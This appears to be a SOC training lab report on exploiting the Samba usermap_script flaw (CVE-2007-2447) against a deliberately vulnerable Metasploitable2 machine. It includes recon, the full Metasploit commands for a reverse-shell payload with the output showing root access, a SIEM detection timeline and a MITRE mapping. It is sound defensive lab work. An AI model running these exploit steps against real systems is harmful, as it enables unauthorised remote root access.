#  Sub-Report 1: Attack Simulation — Metasploit Samba Exploit
**Date:** 01 April 2026
**Attacker IP:** `10.0.2.20` (Kali Linux)
**Target IP:** `192.168.10.5` (Metasploitable2)
**Module:** `exploit/multi/samba/usermap_script`

---

## Environment

| Component      | Details                          |
|----------------|----------------------------------|
| Attacker       | Kali Linux — IP: `10.0.2.20`     |
| Target         | Metasploitable2 — IP: `192.168.10.5` |
| Exploit Module | exploit/multi/samba/usermap_script |
| Payload        | cmd/unix/reverse                 |
| LPORT          | 4444                             |

---

## Step-by-Step Execution

### Step 1: Reconnaissance — Nmap Scan
```bash
nmap -sV -p 139,445 192.168.10.5

# Output:
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

### Step 2: Vulnerability Identification
```bash
searchsploit samba 3.0.20
# → Samba 3.0.20 < 3.0.25rc3 - Username map script (Metasploit)
```

### Step 3: Metasploit Exploitation
```bash
msfconsole
msf6> use exploit/multi/samba/usermap_script
msf6 exploit(...)> set RHOSTS 192.168.10.5
msf6 exploit(...)> set LHOST 10.0.2.20
msf6 exploit(...)> set LPORT 4444
msf6 exploit(...)> run

# Output:
[*] Started reverse TCP handler on 10.0.2.20:4444
[*] Command shell session 1 opened (10.0.2.20:4444 → 192.168.10.5:50712)
```

### Step 4: Post-Exploitation Verification
```bash
id
# uid=0(root) gid=0(root)

hostname
# metasploitable

uname -a
# Linux metasploitable 2.6.24-16-server #1 SMP

whoami
# root
```

---

## Exploitation Log

| Timestamp           | Action                          | Result                        |
|---------------------|---------------------------------|-------------------------------|
| 2026-04-01 07:00:00 | Nmap scan on 192.168.10.5       | Samba 3.0.20 detected         |
| 2026-04-01 07:10:00 | Searchsploit lookup             | CVE-2007-2447 identified      |
| 2026-04-01 07:15:00 | Metasploit exploit run          | Reverse shell obtained        |
| 2026-04-01 07:22:00 | Post-exploit commands run       | Root access confirmed         |
| 2026-04-01 08:05:00 | Wazuh alert triggered           | Detected by SIEM              |

---

## MITRE Mapping

| Tactic              | Technique  | Description                           |
|---------------------|------------|---------------------------------------|
| Initial Access      | T1210      | Exploitation of Remote Services       |
| Execution           | T1059      | Command Shell via reverse TCP         |
| Privilege Escalation| T1068      | Exploit runs as root                  |
| Discovery           | T1087      | User/system enumeration               |

---

*Sub-Report Author: SOC Analyst | cyart-soc-team | 01 April 2026*
